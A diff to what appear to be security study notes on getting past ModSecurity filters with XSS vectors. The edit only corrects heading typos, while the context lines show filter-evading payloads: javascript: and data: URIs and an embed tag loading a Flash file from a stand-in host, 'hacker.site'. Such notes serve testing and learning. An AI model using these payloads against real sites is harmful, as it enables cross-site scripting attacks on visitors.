@@ -59,7 +59,7 @@ Its the most common. Their goal is to detect specific patterns and prevent malic
 ## ModSecurity > Script Tag Based XSS Vectors Rule
 There are several alternatives in which its possible to run our code, such as different HTML tags and related event handlers.
 
-### Beyong <script> Tag... Using HTML Attributes
+### Beyond script Tag... Using HTML Attributes
 ```js
 <a href="javascript:alert(1)">show</a>
 <a href="data:text/html;base64,<alert(1) encoded>"show</a>
@@ -73,7 +73,7 @@ There are several alternatives in which its possible to run our code, such as di
 <embed code="//hacker.site/xss.swf" allowscriptaccess=always>
 ```
 
-### Beyong <script> Tag... Using HTML Events
+### Beyond script Tag... Using HTML Events
 - Events are they way that HTML DOM adds interactivity between the website and its visitors; This happens simply by executing the client-side code (e.g, JavaScript)
 
 Almost all event handler identifier start with **on** and are followerd by the name of the event. One of the most used is **onerror**:
